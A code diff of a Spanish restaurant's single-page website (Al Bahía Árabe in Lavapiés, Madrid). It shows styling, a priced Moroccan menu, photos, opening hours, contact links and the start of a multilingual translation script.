@@ -1,339 +1,105 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="utf-8">
+<html lang="es"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Al Bahía Árabe · Restaurante árabe en Lavapiés, Madrid</title>
-<meta name="description" content="Restaurante árabe auténtico en Lavapiés, Madrid centro. Nuevo local más amplio, mismos sabores, mismos precios.">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Lato:wght@400;700&display=swap">
-<style>
-:root{--red:#a8231c;--green:#1d6b3b;--bg:#fffaf2;--card:#ffffff;--text:#2a1f1a;--muted:#6b5b52;--line:#e8dcc8;--gold:#c9a24a;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#1b1412;--card:#251b18;--text:#f6ede0;--muted:#c3b3a3;--line:#3d2e29;--red:#d6483f;--green:#3f9a62}}
-:root[data-theme="dark"]{--bg:#1b1412;--card:#251b18;--text:#f6ede0;--muted:#c3b3a3;--line:#3d2e29;--red:#d6483f;--green:#3f9a62}
-*{box-sizing:border-box}
-html{scroll-behavior:smooth;scroll-padding-top:env(safe-area-inset-top,0px)}
-body{margin:0;background:var(--bg);color:var(--text);font-family:Lato,system-ui,sans-serif;line-height:1.6}
-h1,h2,h3{font-family:Amiri,Georgia,serif;margin:0}
-a{color:inherit}
-.pat{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48'%3E%3Cpath d='M24 2l6 14 14 6-14 6-6 14-6-14L4 22l14-6z' fill='none' stroke='%23ffffff' stroke-opacity='.22' stroke-width='1.5'/%3E%3C/svg%3E")}
-nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;display:flex;gap:18px;justify-content:center;flex-wrap:wrap;padding:10px 12px;background:var(--green);color:#fff;font-weight:700;font-size:.95rem}
-nav a{text-decoration:none;opacity:.95}
-.vitrina{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;padding:8px;background:var(--green)}.vitrina img{flex:1 1 300px;max-width:100%;height:auto;object-fit:contain;border:4px solid #fff;border-radius:6px}
-.hero{background-color:var(--red);color:#fff;text-align:center;padding:64px 20px 72px;border-bottom:6px solid var(--green)}
-.ar{font-family:Amiri,serif;font-size:1.8rem;color:#ffe9b3;direction:rtl}
-.hero h1{font-size:clamp(2.4rem,9vw,4.2rem);margin:6px 0}
-.hero p{max-width:620px;margin:10px auto 26px;font-size:1.08rem}
-.btn{display:inline-block;padding:13px 26px;border-radius:999px;text-decoration:none;font-weight:700;margin:5px}
-.b1{background:#fff;color:var(--red)}
-.b2{border:2px solid #fff;color:#fff}
-section{max-width:960px;margin:0 auto;padding:54px 20px}
-h2{font-size:2.1rem;color:var(--red);text-align:center}
-h2::after{content:"";display:block;width:90px;height:4px;margin:10px auto 26px;background:linear-gradient(90deg,var(--red) 33%,var(--bg) 33% 66%,var(--green) 66%);border:1px solid var(--line)}
-.lead{text-align:center;max-width:680px;margin:0 auto;color:var(--muted)}
-.notice{background:var(--card);border:2px solid var(--green);border-radius:14px;padding:22px;text-align:center}
-.notice strong{color:var(--green)}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
-.card{background:var(--card);border:1px solid var(--line);border-top:4px solid var(--green);border-radius:12px;padding:18px}
-.card:nth-child(even){border-top-color:var(--red)}
-.card h3{font-size:1.35rem}
-.card p{margin:6px 0 0;color:var(--muted);font-size:.96rem}
-.card ul{list-style:none;margin:10px 0 0;padding:0}.card li{display:flex;justify-content:space-between;gap:12px;padding:5px 0;border-bottom:1px dashed var(--line);font-size:.95rem}.card li b{white-space:nowrap;color:var(--red)}.card li small{display:block;color:var(--muted);font-size:.8rem}.card li:last-child{border-bottom:0}
-nav select{width:auto;background:#fff;color:var(--green);border:0;border-radius:999px;padding:3px 10px;font-weight:700}
-.gal{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}.gal img{width:100%;aspect-ratio:3/4;object-fit:cover;border:3px solid var(--card);border-radius:8px;cursor:zoom-in;background:var(--line)}
-#lb{display:none;position:fixed;inset:0;z-index:20;background:rgba(0,0,0,.92);align-items:center;justify-content:center}#lb img{max-width:92%;max-height:88%;object-fit:contain}#lb button{position:absolute;top:50%;background:rgba(255,255,255,.25);color:#fff;border:0;width:44px;height:44px;border-radius:50%;font-size:1.6rem;padding:0}.pv{left:8px}.nx{right:8px}.photos img{aspect-ratio:4/3}.rate{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:8px}.score{font-family:Amiri,serif;font-size:3.4rem;color:var(--green);line-height:1}.stars{font-size:1.8rem;letter-spacing:2px;background:linear-gradient(90deg,#e0a800 var(--p),#d8cdb8 var(--p));-webkit-background-clip:text;background-clip:text;color:transparent}.rate p{margin:0;color:var(--muted)}
-.call.chat{bottom:calc(166px + env(safe-area-inset-bottom,0px));background:var(--green);color:#fff;animation:plg 2s infinite;cursor:pointer;padding:0}@keyframes plg{0%{box-shadow:0 0 0 0 rgba(29,107,59,.6),0 6px 18px rgba(0,0,0,.35)}70%{box-shadow:0 0 0 18px rgba(29,107,59,0),0 6px 18px rgba(0,0,0,.35)}100%{box-shadow:0 0 0 0 rgba(29,107,59,0),0 6px 18px rgba(0,0,0,.35)}}.mc{align-self:flex-start;background:var(--green);color:#fff;text-decoration:none;font-weight:700;font-size:.85rem;padding:7px 14px;border-radius:999px}
-#cw{position:fixed;right:12px;bottom:calc(12px + env(safe-area-inset-bottom,0px));z-index:25;width:min(94vw,360px);height:min(72vh,500px);background:var(--card);color:var(--text);border:2px solid var(--green);border-radius:16px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.4)}#cw[hidden]{display:none}
-.ch{background:var(--green);color:#fff;padding:10px 14px;display:flex;justify-content:space-between;align-items:center}.ch button{background:none;color:#fff;font-size:1.5rem;padding:0 4px}
-#cm{flex:1;overflow:auto;padding:10px;display:flex;flex-direction:column;gap:8px}.mb{max-width:86%;padding:8px 12px;border-radius:14px;font-size:.93rem}.bot{background:var(--line);align-self:flex-start}.usr{background:var(--red);color:#fff;align-self:flex-end}
-#cc{display:flex;flex-wrap:wrap;gap:6px;padding:0 10px 6px}#cc button{background:var(--card);color:var(--green);border:1px solid var(--green);padding:5px 10px;font-size:.82rem}
-.cf{display:flex;gap:6px;padding:6px 10px}.cf input{flex:1}.cf button{padding:0 16px}
-.hrs{list-style:none;max-width:420px;margin:0 auto;padding:0}.hrs li{display:flex;justify-content:space-between;padding:9px 4px;border-bottom:1px dashed var(--line)}.hrs b{color:var(--green)}.hrs li:first-child b{color:var(--red)}.cl{display:block;text-align:center;background:var(--red);color:#fff;text-decoration:none;font-weight:700;padding:12px}.strip{grid-template-columns:repeat(5,1fr);gap:6px;padding:6px 8px 8px;background:var(--green)}.strip img{aspect-ratio:1/1;border:2px solid #fff;border-radius:6px}
-.call{position:fixed;right:16px;bottom:calc(18px + env(safe-area-inset-bottom,0px));z-index:15;width:60px;height:60px;border-radius:50%;background:var(--red);color:#fff;display:flex;align-items:center;justify-content:center;border:3px solid #fff;animation:pl 2s infinite}.call svg{width:28px;height:28px;fill:currentColor}.gps{background:#fff;color:var(--green);border-color:var(--green);bottom:calc(92px + env(safe-area-inset-bottom,0px));animation:none;box-shadow:0 6px 18px rgba(0,0,0,.35)}@keyframes pl{0%{box-shadow:0 0 0 0 rgba(168,35,28,.6),0 6px 18px rgba(0,0,0,.35)}70%{box-shadow:0 0 0 18px rgba(168,35,28,0),0 6px 18px rgba(0,0,0,.35)}100%{box-shadow:0 0 0 0 rgba(168,35,28,0),0 6px 18px rgba(0,0,0,.35)}}
-.band{background:var(--green);color:#fff}
-.band h2{color:#fff}
-.band .lead{color:#e9f4ec}
-.vals{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:20px;text-align:center}
-.vals div{border:1px solid rgba(255,255,255,.4);border-radius:12px;padding:16px}
-.vals b{font-family:Amiri,serif;font-size:1.3rem;display:block}
-form{display:grid;gap:12px;max-width:520px;margin:0 auto}
-input,select,textarea{width:100%;padding:12px;border:1px solid var(--line);border-radius:10px;font:inherit;background:var(--card);color:var(--text)}
-button{background:var(--red);color:#fff;border:0;border-radius:999px;padding:14px;font:inherit;font-weight:700;cursor:pointer}
-.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.map{text-align:center}
-footer{background:var(--red);color:#fff;text-align:center;padding:26px 16px;border-top:6px solid var(--green);font-size:.95rem}
-@media (max-width:480px){.row{grid-template-columns:1fr}}
-</style>
-</head>
-<body>
-<nav><a href="#inicio">Inicio</a><a href="#nuevo">Nuevo local</a><a href="#fotos">Fotos</a><a href="#carta">Carta</a><a href="#galeria">Galería</a><a href="#resenas">Reseñas</a><a href="#reservas">Reservas</a><a href="#horario">Horario</a><a href="#donde">Dónde estamos</a><select id="lang" aria-label="Idioma"><option value="es">Español</option><option value="en">English</option><option value="fr">Français</option><option value="it">Italiano</option><option value="ar">العربية</option><option value="nl">Nederlands</option><option value="de">Deutsch</option></select></nav>
-<div class="vitrina"><img src="https://i.imgur.com/aLF33YG.jpeg" alt="Al Bahía Árabe" onerror="this.parentNode.style.display='none'"></div>
-
-<div id="destacadas" class="gal strip"><img src="https://i.imgur.com/hkMi3WB.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/wVxyVR4.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/VXSIIvH.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/1QfVEPU.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/XI0NY8X.jpeg" alt="Al Bahía Árabe"></div>
-<header class="hero pat" id="inicio">
-  <div class="ar">أهلاً وسهلاً</div>
-  <h1>Al Bahía Árabe</h1>
-  <p>El restaurante árabe auténtico más conocido de Lavapiés. Sabores de toda la vida, únicos e inolvidables: viaja a la cultura árabe sin salir de Madrid.</p>
-  <a class="btn b1" href="#reservas">Reservar mesa</a>
-  <a class="btn b2" href="https://maps.app.goo.gl/DLno6HewuRTpfthL6" target="_blank" rel="noopener">Cómo llegar</a>
-</header>
-
-<section id="nuevo">
-  <h2>Estrenamos local</h2>
-  <div class="notice">
-    <p>Después de muchos años en la calle Lavapiés, nos hemos mudado a un local con más espacio para nuestros clientes, en la misma zona.</p>
-    <p style="font-weight:700;color:var(--green)">Lo que importa sigue igual: la calidad, los sabores, los precios y el servicio de siempre. ¡Visítanos en el nuevo local!</p>
-  </div>
-</section>
-
-<div class="band pat">
-<section>
-  <h2>Una tradición de sabor</h2>
-  <p class="lead">Recetas de siempre, especias frescas y la hospitalidad de la mesa árabe, en pleno corazón de Madrid.</p>
-  
-</section>
-</div>
-
-<section id="resenas"><h2>Lo que dicen de nosotros</h2>
-<div class="rate"><div class="score">4,4</div><div><div class="stars" style="--p:88%">★★★★★</div><p>658 reseñas en Google</p></div></div>
-<p class="lead" style="margin-bottom:22px">Restaurante marroquí · 10–20 € por persona</p>
-<div class="grid"><div class="card"><p>Los visitantes recomiendan pedir la pastela de pollo.</p></div><div class="card"><p>Destacan el auténtico desayuno marroquí con pan recién hecho.</p></div></div>
-<p style="text-align:center;margin-top:18px"><a class="btn b1" style="background:var(--green);color:#fff" href="https://maps.app.goo.gl/DLno6HewuRTpfthL6" target="_blank" rel="noopener">Ver reseñas en Google</a></p></section>
-<section id="fotos"><h2>Nuestro restaurante en fotos</h2><div class="gal photos"><img src="https://i.imgur.com/Ju12YJK.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/q50LODK.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/5efPfTy.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/edVomob.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/yCBZkuf.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/IfFHMCl.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/Fh5OYHW.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/Ec3lYzc.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/dBZExTW.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/xIwYpZQ.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/R5NJV3F.jpeg" alt="Al Bahía Árabe"><img src="https://i.imgur.com/JO7zWvu.jpeg" alt="Al Bahía Árabe"></div></section>
-<section id="carta">
-  <h2>Nuestra carta</h2>
-  <p class="lead" style="margin-bottom:22px">Cocina árabe y marroquí casera, con los precios de siempre.</p>
-  <div class="grid">
-    <div class="card"><h3>Ensaladas</h3><ul><li>Ensalada mixta<b>3,00 €</b></li><li>Ensalada magrebí (1 persona)<b>3,00 €</b></li><li>Tabulé<b>3,50 €</b></li><li><span>Bakkula<small>Espinacas al ajillo estilo magrebí</small></span><b>4,00 €</b></li><li>Hojas de parra rellenas de arroz<b>5,00 €</b></li><li>Arroz con verduras<b>4,00 €</b></li><li>Zanahoria a la sharmula<b>4,00 €</b></li><li>Zaaluk<b>5,00 €</b></li><li>Plato vegetal<b>7,00 €</b></li></ul></div>
-    <div class="card"><h3>Sopas</h3><ul><li><span>Harira<small>Sopa típica de Marruecos</small></span><b>2,00 €</b></li><li><span>Baisar<small>Crema de habas</small></span><b>3,00 €</b></li><li>Crema de verduras<b>4,00 €</b></li><li>Lentejas estilo marroquí<b>3,00 €</b></li><li>Judías estilo marroquí<b>3,00 €</b></li></ul></div>
-    <div class="card"><h3>Entrantes</h3><ul><li><span>Knetat de queso<small>Barritas rellenas de queso</small></span><b>4,00 €</b></li><li><span>Falafel<small>Croquetas de garbanzos y especias</small></span><b>5,00 €</b></li><li>Humus de garbanzos<b>4,00 €</b></li><li>Crema de berenjenas<b>4,00 €</b></li><li><span>Kibba<small>Croquetas de carne con frutos secos</small></span><b>6,00 €</b></li><li><span>Taktuka<small>Pimientos asados con tomate y ajo</small></span><b>4,00 €</b></li><li>Cuscús vegetal<b>5,50 €</b></li></ul></div>
-    <div class="card"><h3>Huevos</h3><ul><li><span>Huevos fritos<small>Con patatas fritas y salsa de tomate</small></span><b>4,00 €</b></li><li>Huevos cocidos<b>0,80 €</b></li><li>Ración de patatas fritas<b>2,00 €</b></li></ul></div>
-    <div class="card"><h3>Especialidades de pollo</h3><ul><li><span>Cuscús de pollo royale<small>Verduras, garbanzos, pasas y ciruelas</small></span><b>8,00 €</b></li><li><span>Tajine de pollo royale<small>Verduras, patatas fritas y aceitunas</small></span><b>6,50 €</b></li><li>Pastela de pollo (1 persona)<b>8,50 €</b></li><li>Pastela de pollo (2 personas)<b>17,00 €</b></li><li>Pastela de pollo (4 personas)<b>Consultar</b></li><li>Filetes de pollo (arroz o patatas)<b>7,00 €</b></li><li>Pinchos de pollo estilo moruno<b>7,00 €</b></li><li><span>Plato combinado<small>Filete de pollo, arroz, huevos y patatas fritas</small></span><b>8,00 €</b></li></ul></div>
-    <div class="card"><h3>Especialidades de cordero</h3><ul><li><span>Cuscús de cordero<small>Verduras, pasas, cebolla y garbanzos</small></span><b>10,00 €</b></li><li><span>Tajine de cordero<small>Con verduras, arroz o patatas y aceitunas, o con ciruelas y almendras</small></span><b>9,00 €</b></li><li>Chuletitas de cordero<b>10,00 €</b></li><li>Pinchos de cordero (estilo moruno)<b>10,00 €</b></li><li>Cordero asado (por encargo)<b>Consultar</b></li><li>Cordero al vapor (por encargo)<b>Consultar</b></li></ul></div>
-    <div class="card"><h3>Especialidades de ternera</h3><ul><li><span>Cuscús de ternera<small>Verduras, pasas, cebolla y garbanzos</small></span><b>8,00 €</b></li><li>Tajine de ternera<b>6,50 €</b></li><li>Tajine de albóndigas y huevo<b>7,00 €</b></li><li>Filete de ternera (arroz o patatas)<b>7,00 €</b></li><li>Pinchos de ternera (estilo moruno)<b>7,00 €</b></li><li><span>Plato combinado<small>Filete o kefta, arroz, huevos y patatas</small></span><b>8,00 €</b></li><li><span>Kebab<small>Pinchos de carne picada</small></span><b>7,00 €</b></li><li><span>Kefta a la plancha<small>Hamburguesa moruna</small></span><b>7,00 €</b></li></ul></div>
-    <div class="card"><h3>Pan y dulces caseros</h3><ul><li>Pan de la casa<b>1,50 €</b></li><li>Bagrir<b>1,50 €</b></li><li>Dulces típicos de Marruecos (unidad)<b>1,00 €</b></li><li><span>Rgaif<small>Crepe con miel, mantequilla o queso</small></span><b>1,50 €</b></li><li><span>Harcha<small>Pan dulce de sémola</small></span><b>1,20 €</b></li><li>Bizcocho casero<b>1,00 €</b></li></ul></div>
-    <div class="card"><h3>Bebidas y zumos</h3><ul><li>Agua mineral grande<b>1,50 €</b></li><li>Agua mineral pequeña<b>1,00 €</b></li><li>Cerveza sin alcohol<b>2,00 €</b></li><li>Naranja natural<b>3,00 €</b></li><li>Zanahoria<b>4,00 €</b></li><li>Zanahoria con jengibre<b>4,00 €</b></li><li>Zanahoria y manzana<b>4,00 €</b></li><li>Zanahoria y naranja<b>4,00 €</b></li><li>Naranja, melocotón y limón<b>4,00 €</b></li><li>Naranja, fresa, coco, melocotón y plátano<b>4,00 €</b></li><li>Piña, coco, manzana y plátano<b>3,00 €</b></li><li><span>Panaché, con o sin leche<small>Aguacate, plátano y manzana con zumo de naranja</small></span><b>4,00 €</b></li><li>Batido de aguacate<b>3,00 €</b></li><li>Batido de fruta de temporada<b>3,00 €</b></li><li><span>Laban<small>Yogur casero estilo marroquí</small></span><b>1,50 €</b></li></ul></div>
-    <div class="card"><h3>Café y té</h3><ul><li>Tetera para 1 persona<b>1,50 €</b></li><li>Tetera para 2 personas<b>2,50 €</b></li><li>Tetera para 3 personas<b>4,00 €</b></li><li>Tetera para 4 personas<b>5,00 €</b></li><li>Tetera para 6 personas<b>7,00 €</b></li><li>Tetera grande<b>10,00 €</b></li><li>Café árabe<b>1,50 €</b></li><li>Infusiones variadas<b>2,00 €</b></li></ul></div>
-  </div>
-</section>
-
-<section id="galeria"><h2>Galería de la carta</h2><div class="gal"><img src="https://i.imgur.com/zRjJDrN.jpeg" alt="Carta"><img src="https://i.imgur.com/0qNXI6f.jpeg" alt="Carta"><img src="https://i.imgur.com/R2aVQaX.jpeg" alt="Carta"><img src="https://i.imgur.com/DiT3sXq.jpeg" alt="Carta"><img src="https://i.imgur.com/AfDj3Iz.jpeg" alt="Carta"><img src="https://i.imgur.com/ttOQmwg.jpeg" alt="Carta"><img src="https://i.imgur.com/ZW72TQl.jpeg" alt="Carta"><img src="https://i.imgur.com/GMrPNWO.jpeg" alt="Carta"><img src="https://i.imgur.com/S40fae7.jpeg" alt="Carta"></div></section>
-<div id="lb"><button class="pv">‹</button><img alt=""><button class="nx">›</button></div>
-<div class="band pat">
-<section id="reservas">
-  <h2>Reserva tu mesa</h2>
-  <p class="lead" style="margin-bottom:22px">Ahora con más espacio para grupos, celebraciones y comidas en familia.</p><p class="lead" style="margin-bottom:22px"><a href="tel:+34912400498">912 400 498</a></p>
-  <p style="text-align:center"><a class="btn b1" href="tel:+34912400498">Llamar para reservar</a></p>
-  <p class="lead" style="color:#fff;font-weight:700">Pago en el restaurante: efectivo y tarjeta bancaria</p>
-</section>
-</div>
-
-<section id="horario"><h2>Horario</h2><ul class="hrs"><li><span>Lunes</span><b>Cerrado</b></li><li><span>Martes</span><b>10:00–22:30</b></li><li><span>Miércoles</span><b>10:00–22:30</b></li><li><span>Jueves</span><b>10:00–22:30</b></li><li><span>Viernes</span><b>10:00–22:30</b></li><li><span>Sábado</span><b>10:00–22:30</b></li><li><span>Domingo</span><b>10:00–22:30</b></li></ul></section>
-<section id="donde" class="map">
-  <h2>Dónde estamos</h2>
-  <p class="lead">Nuestro nuevo local está en la misma zona de Lavapiés, Madrid centro.</p>
-  <p class="lead"><b>Calle de Embajadores, 60 · Madrid</b></p>
-  <p><a class="btn b1" style="background:var(--green);color:#fff" href="https://maps.app.goo.gl/DLno6HewuRTpfthL6" target="_blank" rel="noopener">Abrir en Google Maps</a></p>
-</section>
-
-<button class="call chat" id="cb" aria-label="Chat"><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg></button>
-<div id="cw" hidden><div class="ch"><b id="ct"></b><button id="cx" aria-label="Cerrar">×</button></div><div id="cm"></div><div id="cc"></div><div class="cf"><input id="ci"><button id="cs">➤</button></div><a id="ca" class="cl" href="tel:+34912400498"></a></div>
-<a class="call gps" href="https://maps.app.goo.gl/DLno6HewuRTpfthL6" target="_blank" rel="noopener" aria-label="Cómo llegar (GPS)"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 010-5 2.5 2.5 0 010 5z"/></svg></a>
-<a class="call" href="tel:+34912400498" aria-label="Llamar al 912 400 498"><svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.02-.24c1.12.37 2.33.57 3.57.57a1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.45.57 3.57a1 1 0 01-.25 1.02l-2.2 2.2z"/></svg></a>
-<footer>
-  <div class="ar">مطعم الباهية العربي</div>
-  <div>Al Bahía Árabe · Lavapiés, Madrid centro</div>
-</footer>
-
-<script>
-(function(){
-var L=['en','fr','it','ar','nl','de'],D={};
-[
-[`Inicio`,`Home`,`Accueil`,`Home`,`الرئيسية`,`Home`,`Start`],
-[`Nuevo local`,`New venue`,`Nouveau local`,`Nuovo locale`,`المحل الجديد`,`Nieuwe locatie`,`Neues Lokal`],
-[`Carta`,`Menu`,`Carte`,`Menù`,`القائمة`,`Menukaart`,`Speisekarte`],
-[`Galería`,`Gallery`,`Galerie`,`Galleria`,`المعرض`,`Galerij`,`Galerie`],
-[`Reservas`,`Reservations`,`Réservations`,`Prenotazioni`,`الحجز`,`Reserveren`,`Reservierung`],
-[`Dónde estamos`,`Find us`,`Où nous trouver`,`Dove siamo`,`أين نحن`,`Waar zijn we`,`So finden Sie uns`],
-[`El restaurante árabe auténtico más conocido de Lavapiés. Sabores de toda la vida, únicos e inolvidables: viaja a la cultura árabe sin salir de Madrid.`,`The best-known authentic Arab restaurant in Lavapiés. Timeless, unforgettable flavours: travel to Arab culture without leaving Madrid.`,`Le restaurant arabe authentique le plus connu de Lavapiés. Des saveurs de toujours, uniques et inoubliables : voyagez dans la culture arabe sans quitter Madrid.`,`Il ristorante arabo autentico più conosciuto di Lavapiés. Sapori di sempre, unici e indimenticabili: viaggia nella cultura araba senza lasciare Madrid.`,`أشهر مطعم عربي أصيل في لاباپييس. نكهات الأصالة التي لا تُنسى: سافر إلى الثقافة العربية دون أن تغادر مدريد.`,`Het bekendste authentieke Arabische restaurant van Lavapiés. Tijdloze, onvergetelijke smaken: reis naar de Arabische cultuur zonder Madrid te verlaten.`,`Das bekannteste authentische arabische Restaurant in Lavapiés. Zeitlose, unvergessliche Aromen: Reisen Sie in die arabische Kultur, ohne Madrid zu verlassen.`],
-[`Reservar mesa`,`Book a table`,`Réserver une table`,`Prenota un tavolo`,`احجز طاولة`,`Tafel reserveren`,`Tisch reservieren`],
-[`Cómo llegar`,`Directions`,`Itinéraire`,`Indicazioni`,`كيف تصل`,`Route`,`Anfahrt`],
-[`Estrenamos local`,`Our new venue`,`Notre nouveau local`,`Il nostro nuovo locale`,`محلنا الجديد`,`Onze nieuwe locatie`,`Unser neues Lokal`],
-[`Después de muchos años en la calle Lavapiés, nos hemos mudado a un local con más espacio para nuestros clientes, en la misma zona.`,`After many years on Calle Lavapiés, we have moved to a larger venue with more space for our customers, in the same area.`,`Après de nombreuses années rue Lavapiés, nous avons déménagé dans un local plus spacieux pour nos clients, dans le même quartier.`,`Dopo molti anni in Calle Lavapiés, ci siamo trasferiti in un locale più ampio per i nostri clienti, nella stessa zona.`,`بعد سنوات طويلة في شارع لاباپييس، انتقلنا إلى محل أوسع لزبائننا في المنطقة نفسها.`,`Na vele jaren in de Calle Lavapiés zijn we verhuisd naar een ruimere locatie voor onze gasten, in dezelfde buurt.`,`Nach vielen Jahren in der Calle Lavapiés sind wir in ein geräumigeres Lokal für unsere Gäste umgezogen, im selben Viertel.`],
-[`Lo que importa sigue igual: la calidad, los sabores, los precios y el servicio de siempre. ¡Visítanos en el nuevo local!`,`What matters stays the same: quality, flavours, prices and service. Come and visit our new venue!`,`L'essentiel ne change pas : la qualité, les saveurs, les prix et le service. Venez nous rendre visite !`,`Ciò che conta resta uguale: qualità, sapori, prezzi e servizio. Vieni a trovarci nel nuovo locale!`,`ما يهم يبقى كما هو: الجودة والنكهات والأسعار والخدمة. زورونا في محلنا الجديد!`,`Wat telt blijft gelijk: kwaliteit, smaak, prijzen en service. Kom langs in onze nieuwe locatie!`,`Was zählt, bleibt gleich: Qualität, Geschmack, Preise und Service. Besuchen Sie unser neues Lokal!`],
-[`Una tradición de sabor`,`A tradition of flavour`,`Une tradition de saveurs`,`Una tradizione di sapori`,`تقليد من النكهة`,`Een traditie van smaak`,`Eine Tradition des Geschmacks`],
-[`Recetas de siempre, especias frescas y la hospitalidad de la mesa árabe, en pleno corazón de Madrid.`,`Traditional recipes, fresh spices and Arab hospitality, in the heart of Madrid.`,`Des recettes traditionnelles, des épices fraîches et l'hospitalité arabe, au cœur de Madrid.`,`Ricette di sempre, spezie fresche e ospitalità araba, nel cuore di Madrid.`,`وصفات الأصالة وتوابل طازجة وكرم الضيافة العربية في قلب مدريد.`,`Traditionele recepten, verse kruiden en Arabische gastvrijheid, in het hart van Madrid.`,`Traditionelle Rezepte, frische Gewürze und arabische Gastfreundschaft im Herzen Madrids.`],
-[`Nuestra carta`,`Our menu`,`Notre carte`,`Il nostro menù`,`قائمتنا`,`Onze menukaart`,`Unsere Speisekarte`],
-[`Cocina árabe y marroquí casera, con los precios de siempre.`,`Homemade Arab and Moroccan cooking, at our usual prices.`,`Cuisine arabe et marocaine maison, aux prix habituels.`,`Cucina araba e marocchina casalinga, ai soliti prezzi.`,`مطبخ عربي ومغربي منزلي، بالأسعار المعتادة.`,`Huisgemaakte Arabische en Marokkaanse keuken, tegen onze vaste prijzen.`,`Hausgemachte arabische und marokkanische Küche zu den gewohnten Preisen.`],
-[`Ensaladas`,`Salads`,`Salades`,`Insalate`,`سلطات`,`Salades`,`Salate`],
-[`Sopas`,`Soups`,`Soupes`,`Zuppe`,`شوربات`,`Soepen`,`Suppen`],
-[`Entrantes`,`Starters`,`Entrées`,`Antipasti`,`مقبلات`,`Voorgerechten`,`Vorspeisen`],
-[`Huevos`,`Eggs`,`Œufs`,`Uova`,`بيض`,`Eieren`,`Eier`],
-[`Especialidades de pollo`,`Chicken specialities`,`Spécialités de poulet`,`Specialità di pollo`,`أطباق الدجاج`,`Kipspecialiteiten`,`Hähnchenspezialitäten`],
-[`Especialidades de cordero`,`Lamb specialities`,`Spécialités d'agneau`,`Specialità di agnello`,`أطباق لحم الضأن`,`Lamsspecialiteiten`,`Lammspezialitäten`],
-[`Especialidades de ternera`,`Veal specialities`,`Spécialités de veau`,`Specialità di vitello`,`أطباق لحم العجل`,`Kalfsspecialiteiten`,`Kalbsspezialitäten`],
-[`Pan y dulces caseros`,`Homemade bread & sweets`,`Pain et douceurs maison`,`Pane e dolci caserecci`,`خبز وحلويات منزلية`,`Huisgemaakt brood en zoetigheid`,`Hausgemachtes Brot & Süßes`],
-[`Bebidas y zumos`,`Drinks & juices`,`Boissons et jus`,`Bevande e succhi`,`مشروبات وعصائر`,`Dranken en sappen`,`Getränke & Säfte`],
-[`Café y té`,`Coffee & tea`,`Café et thé`,`Caffè e tè`,`قهوة وشاي`,`Koffie en thee`,`Kaffee & Tee`],
-[`Galería de la carta`,`Menu gallery`,`Galerie de la carte`,`Galleria del menù`,`معرض القائمة`,`Menugalerij`,`Speisekarten-Galerie`],
-[`Reserva tu mesa`,`Book your table`,`Réservez votre table`,`Prenota il tuo tavolo`,`احجز طاولتك`,`Reserveer uw tafel`,`Reservieren Sie Ihren Tisch`],
-[`Ahora con más espacio para grupos, celebraciones y comidas en familia.`,`Now with more room for groups, celebrations and family meals.`,`Désormais plus d'espace pour les groupes, les fêtes et les repas en famille.`,`Ora con più spazio per gruppi, feste e pranzi in famiglia.`,`الآن بمساحة أكبر للمجموعات والمناسبات والعائلات.`,`Nu met meer ruimte voor groepen, feesten en familiemaaltijden.`,`Jetzt mit mehr Platz für Gruppen, Feiern und Familienessen.`],
-[`Enviar solicitud de reserva`,`Send booking request`,`Envoyer la demande`,`Invia richiesta`,`أرسل طلب الحجز`,`Reservering versturen`,`Reservierung senden`],
-[`Nuestro nuevo local está en la misma zona de Lavapiés, Madrid centro.`,`Our new venue is in the same area of Lavapiés, central Madrid.`,`Notre nouveau local est dans le même quartier de Lavapiés, au centre de Madrid.`,`Il nostro nuovo locale è nella stessa zona di Lavapiés, centro di Madrid.`,`محلنا الجديد في المنطقة نفسها، لاباپييس، وسط مدريد.`,`Onze nieuwe locatie ligt in dezelfde buurt van Lavapiés, in het centrum van Madrid.`,`Unser neues Lokal liegt im selben Viertel von Lavapiés, im Zentrum von Madrid.`],
-[`Abrir en Google Maps`,`Open in Google Maps`,`Ouvrir dans Google Maps`,`Apri in Google Maps`,`افتح في خرائط غوغل`,`Openen in Google Maps`,`In Google Maps öffnen`],
